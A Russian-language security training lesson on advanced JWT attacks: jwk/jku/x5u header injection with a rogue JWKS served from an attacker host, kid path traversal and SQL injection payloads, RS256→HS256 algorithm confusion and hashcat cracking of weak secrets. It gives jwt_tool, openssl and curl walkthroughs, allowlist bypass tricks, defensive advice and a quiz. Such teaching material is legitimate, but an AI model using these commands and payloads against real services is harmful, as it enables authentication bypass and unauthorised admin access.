---
id: web-jwt-advanced
title: "JWT advanced: jwk/jku/x5u injection, kid injection, alg confusion"
category: web
parent: web-auth-protocols
difficulty: hard
order: 1
tags: [jwt, jwk, jku, x5u, kid, alg-confusion, auth]
prerequisites: [web-auth-jwt-idor]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Продвинутые атаки на JWT: подмена источника ключа (jwk/jku/x5u), инъекция в kid, alg confusion и обход проверки подписи."
---

Базовый урок `web-auth-jwt-idor` разбирает `alg:none` и подделку `uid`. Реальный JWT-функционал имеет куда более широкую поверхность атаки: заголовок токена (`jwk`, `jku`, `x5u`, `kid`) часто управляет тем, **какой ключ** используется для проверки, и если приложение доверяет этим полям — подпись можно подделать, не зная секрета. Этот урок — про «второй эшелон» JWT-багов, которые встречаются в bug bounty постоянно.

## Теория: анатомия и точки доверия

JWT = `base64url(header).base64url(payload).base64url(signature)`.

Заголовок может содержать:
- `alg` — алгоритм (`HS256`, `RS256`, `none`).
- `kid` — key ID: какой ключ из хранилища использовать.
- `jwk` — **встроенный публичный ключ**.
- `jku` — URL, откуда загрузить набор ключей (JWKS).
- `x5u` / `x5c` — URL/цепочка X.509-сертификатов.

Опасность: если библиотека/приложение **доверяет** `jwk`/`jku`/`x5u`, вы подсовываете свой ключ и подписываете токен своим приватным ключом. Если `kid` уходит в файловую систему/SQL — path traversal или SQLi. Если `alg` не пиннится — алгоритм-конфьюжн (RS256 → HS256 с публичным ключом как HMAC-секретом).

## Атака 1: jwk / jku / x5u injection

**jwk injection.** Библиотека берёт ключ из поля `jwk` заголовка:

1. Генерируем свою пару RSA:
   ```bash
   openssl genrsa -out key.pem 2048
   openssl rsa -in key.pem -pubout -out pub.pem
   ```
2. Формируем заголовок с нашим публичным ключом в JWK и `alg:RS256`.
3. Подписываем payload своим приватным ключом.
4. Если сервер использует `jwk` из заголовка — токен валиден, `role:admin` принят.

**jku injection.** `jku` указывает на JWKS-URL. Поднимаем свой `https://attacker/jwks.json` с нашим публичным ключом, ставим `jku` в заголовок, подписываем своим ключом. Сервер качает ключи с нашего URL → проверка проходит.

```json
{"alg":"RS256","kid":"attacker","jku":"https://attacker/jwks.json"}
```

**x5u** — аналогично, но с X.509-сертификатом по URL.

Защита обычно — allowlist доменов для `jku`; обход через `https://expected.com@attacker/`, открытый редирект на allowed-домене, subdomain-трюки.

## Атака 2: kid injection

`kid` может подставляться в путь к файлу или в SQL:

- **Path traversal:** `kid: ../../../../dev/null` → ключ читается из `/dev/null` (пусто). Тогда HMAC-секрет = пустая строка, и мы подписываем токен пустым ключом:
  ```bash
  python3 jwt_tool.py <token> -T -S hs256 -p "" -I -hc kid -hv "../../../../dev/null"
  ```
- **SQLi в kid:** `kid: ' UNION SELECT 'knownsecret'-- -` → сервер берёт наш «секрет» из БД и проверяет им.
- **Command injection в kid:** если kid уходит в shell/путь — возможен RCE (редко, но бывает).

## Атака 3: alg confusion (RS256 → HS256)

Сервер объявляет `RS256` и проверяет публичным ключом. Если библиотека позволяет смену `alg` на `HS256`, она использует **публичный ключ как HMAC-секрет**. Мы:
1. Достаём публичный ключ (из `/jwks.json`, `.well-known`, TLS-сертификата).
2. Подписываем payload `HS256` с этим публичным ключом как секретом.
3. Сервер проверяет HMAC — и подпись совпадает.

```bash
python3 jwt_tool.py <token> -X k -pk pub.pem
```

Вариант `none`: убрать подпись и поставить `alg:none` (см. базовый урок).

## Разобранный пример: полная цепочка

Цель: `https://api.example/` принимает `Authorization: Bearer <jwt>`, есть `/jwks.json`.

Шаг 1. Декодируем свой токен, видим `{"alg":"RS256","kid":"key1"}`.

Шаг 2. Пробуем alg:none — 401 (пиннится).

Шаг 3. Смотрим `/jwks.json` → публичный ключ. Пробуем alg confusion:
```bash
python3 jwt_tool.py $TOKEN -X k -pk jwks_pub.pem
curl -s -H "Authorization: Bearer $FORGED" https://api.example/admin
# 200 -> принимает HS256 с публичным ключом как секретом
```

Шаг 4. Если конфьюжн закрыт, пробуем kid traversal:
```bash
python3 jwt_tool.py $TOKEN -T -S hs256 -p "" -I -hc kid -hv "../../../../../dev/null"
```

Шаг 5. Если `jku` не проверяется по allowlist — поднимаем JWKS и подписываем своим ключом.

## Инструменты

- **jwt_tool** (`python3 jwt_tool.py <token> -M -X ...`) — основной комбайн.
- **jwt.io** — декодирование.
- **hashcat `-m 16500`** — брут HMAC-секрета офлайн (если он слабый).
- **`jose`/`jsonwebtoken`** — для ручной сборки токенов.
- **Burp JWT Editor** — удобно менять заголовки в браузере.

```bash
# брут слабого HMAC-секрета
hashcat -m 16500 token.txt rockyou.txt
```

## Дополнительные векторы

- **Weak HMAC secret** — `secret`, `password`, имя компании. Ломается за секунды.
- **kid как индекс в массиве ключей** — подмена на предсказуемый.
- **Вложенные JWT (`cty:JWT`)** — вложенный токен проверяется иначе; confusion.
- **JWKS caching** — если jku закеширован, отдайте ключи один раз и меняйте поведение.
- **`crit`/неизвестные заголовки** — некоторые библиотеки игнорируют, некоторые падают.
- **Пустой секрет при `alg:HS256`** и `kid`, указывающем на пустой файл.

## Частые ошибки

- **Сразу ломать `alg:none`.** Он часто выключен; не останавливайтесь — kid/jku шире.
- **Не искать JWKS.** `/jwks.json`, `/.well-known/jwks.json`, `/.well-known/openid-configuration` — источник публичного ключа.
- **Забыть про claim-валидацию.** Даже с валидной подписью проверяйте `exp`, `aud`, `iss` — приложение может их не проверять.
- **Путать `jku` и `jwk`.** `jwk` — ключ inline, `jku` — URL.
- **Не проверять регистр/кодирование.** `alg:Hs256`, `none` в разном регистре — иногда проходит.
- **Игнорировать kid в SQL.** Классическая инъекция, которую пропускают.

## Полный разбор: JKU injection с поднятым JWKS

Пошагово, с командами и выводом. Цель — приложение, читающее заголовок `jku` и не проверяющее домен источника ключей.

Шаг 1. Смотрим свой токен и находим JWKS-эндпоинт:

```bash
TOKEN='eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1aWQiOiJ1c2VyIn0.sig'
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
# {"alg":"RS256","kid":"key1"}
curl -s https://api.example/.well-known/jwks.json | jq .
# {"keys":[{"kty":"RSA","kid":"key1","n":"0vx7...","e":"AQAB"}]}
```

Шаг 2. Генерируем свою пару и публикуем JWKS на своём хосте:

```bash
openssl genrsa -out attack.pem 2048
python3 - <<'PY'
import json
from jwcrypto import jwk
k = jwk.JWK.from_pem(open('attack.pem','rb').read())
pub = json.loads(k.export_public())
pub.update({"kid":"attack","use":"sig","alg":"RS256"})
json.dump({"keys":[pub]}, open('jwks.json','w'))
PY
python3 -m http.server 8000    # отдаём http://ATTACKER:8000/jwks.json
```

Шаг 3. Формируем токен с `jku` на свой хост и подписываем приватным ключом:

```bash
python3 jwt_tool.py $TOKEN -I -hc jku -hv "http://ATTACKER:8000/jwks.json" -S -pc attack.pem
# header -> {"alg":"RS256","kid":"attack","jku":"http://ATTACKER:8000/jwks.json"}
```

Шаг 4. Проверяем доступ:

```bash
curl -s -H "Authorization: Bearer $FORGED" https://api.example/admin/users
# HTTP/1.1 200 OK
# [{"id":1,"login":"admin"}]
```

Если домен `jku` проверяется по allowlist — обходим: `http://expected.com@ATTACKER/`, `https://expected.com.attacker.tld/`, открытый редирект на expected-домене, `//ATTACKER/`, подмена схемы, `file:///dev/null` (пустой JWKS).

## kid injection: path traversal и SQLi

`kid` часто попадает в файловый путь (`/keys/<kid>.pem`) или в SQL (`SELECT key FROM keys WHERE id='<kid>'`).

Path traversal к пустому файлу:

```bash
python3 jwt_tool.py $TOKEN -T -S hs256 -p "" -I -hc kid -hv "../../../../dev/null"
curl -s -H "Authorization: Bearer $FORGED" https://api.example/me -o /dev/null -w '%{http_code}\n'
# 200
```

Другие предсказуемые пути: `/proc/self/cmdline`, `/etc/hostname`, `/dev/zero` (нулевой ключ), а также ваш собственный загруженный файл в `/uploads/x`. SQLi в `kid`:

```bash
# kid = ' UNION SELECT 'known' -- -
python3 jwt_tool.py $TOKEN -T -S hs256 -p "known" -I -hc kid -hv "' UNION SELECT 'known' -- -"
```

Если `kid` — индекс массива ключей (`kid: 0`), перебираем индексы и подписываем известным ключом.

## Reference-таблица: поля заголовка JWT и их риск

| Поле | Что задаёт | Атака | Условие успеха |
|------|-----------|-------|----------------|
| `alg` | алгоритм проверки | `none`, RS256→HS256 | библиотека не пиннит алгоритм |
| `kid` | какой ключ взять | path traversal, SQLi, выбор известного ключа | kid уходит в ФС/SQL без валидации |
| `jwk` | встроенный публичный ключ | подсовываем свой ключ | библиотека доверяет `jwk` из заголовка |
| `jku` | URL JWKS | свой JWKS | нет allowlist домена |
| `x5u`/`x5c` | X.509 по URL/цепочка | свой сертификат | нет проверки доверия к цепочке |
| `typ`/`cty` | тип токена | вложенный JWT confusion | обработка `cty:JWT` |
| `crit` | критичные расширения | игнор/падение | библиотека не понимает поле |

## Алгоритм-конфьюжн на практике: детали

Классическая ошибка кода — функция `verify(token, key)` без параметра `algorithms`. Тогда библиотека берёт `alg` из заголовка. Для RS256→HS256:

1. Достаём публичный ключ из JWKS или TLS-сертификата (`openssl s_client -connect api.example:443 | openssl x509 -pubkey -noout`).
2. Сохраняем его в PEM **ровно как есть** (включая переводы строк) — это будет HMAC-секрет.
3. Подписываем payload `HS256` этим PEM-файлом как секретом.

```bash
openssl s_client -connect api.example:443 -servername api.example </dev/null 2>/dev/null \
  | openssl x509 -pubkey -noout > pub.pem
python3 jwt_tool.py $TOKEN -X k -pk pub.pem
# Проверяем:
curl -s -H "Authorization: Bearer $FORGED" https://api.example/admin -o /dev/null -w '%{http_code}\n'
# 200
```

Тонкость: некоторые библиотеки берут ключ как сырые байты, некоторые — как нормализованный DER; иногда нужен DER-формат (`openssl rsa -pubin -in pub.pem -outform DER -out pub.der`).

## Что делать дальше / решение

Порядок действий при JWT-мисконфиге:

1. **Декодировать** свой токен, выписать `alg`, `kid`, наличие `jwk`/`jku`/`x5u`.
2. **Найти JWKS**: `/jwks.json`, `/.well-known/jwks.json`, `/.well-known/openid-configuration`.
3. **Проверить `alg:none`**, затем **alg confusion** (RS256→HS256).
4. **Проверить `jku`/`jwk`/`x5u`** — доверяет ли сервер источнику ключа.
5. **Проверить `kid`** — path traversal / SQLi / индекс.
6. **Сломать слабый HMAC-секрет** офлайн: `hashcat -m 16500 token.txt rockyou.txt`.
7. **Валидация claim'ов**: даже с валидной подписью проверьте `exp`, `aud`, `iss`, `nbf` — их отсутствие даёт вечный токен.

Решение на защите: пиннинг `alg`, allowlist доменов для `jku`/`x5u`, отказ от `jwk` из заголовка, `kid` по строгому whitelist, сильный секрет/ключ, обязательная проверка `aud`/`iss`/`exp`.

## Квиз

```quiz
- question: "Что делает поле jku в заголовке JWT?"
  options:
    - "Задаёт срок жизни"
    - "Указывает URL, откуда загрузить набор ключей"
    - "Хранит пароль"
    - "Кодирует payload"
  answer: 1
  explanation: "JWK Set URL — источник ключей проверки."
- question: "В чём суть атаки alg confusion RS256 -> HS256?"
  options:
    - "Публичный ключ используется как HMAC-секрет"
    - "Подпись отключается"
    - "Меняется payload"
    - "Удаляется kid"
  answer: 0
  explanation: "Библиотека проверяет HMAC, где секретом выступает публичный RSA-ключ."
- question: "Как эксплуатируется kid при path traversal?"
  options:
    - "kid указывает на /dev/null, и HMAC-секрет становится пустым"
    - "kid шифрует токен"
    - "kid меняет алгоритм"
    - "kid задаёт aud"
  answer: 0
  explanation: "Пустой ключ легко воспроизвести при подписи."
- question: "Где взять публичный ключ для alg confusion?"
  options:
    - "В логах"
    - "Из /jwks.json или .well-known/openid-configuration"
    - "Из cookie"
    - "Из robots.txt"
  answer: 1
  explanation: "JWKS-эндпоинты публично отдают ключи."
- question: "Какой инструмент удобен для JWT-атак?"
  options:
    - "sqlmap"
    - "jwt_tool"
    - "nmap"
    - "ffuf"
  answer: 1
  explanation: "jwt_tool умеет none, alg confusion, kid/jku-инъекции."
```

## Где пригодится

- **CTF (Web):** обход аутентификации и эскалация до admin через JWT.
- **Bug bounty:** JWT-мисконфиги — частый критичный отчёт.
- **Пентест:** проверка реализации сессий на JWT.
- **Работа (AppSec):** пиннинг алгоритма, проверка kid/jku по allowlist, сильные секреты, валидация claim'ов.
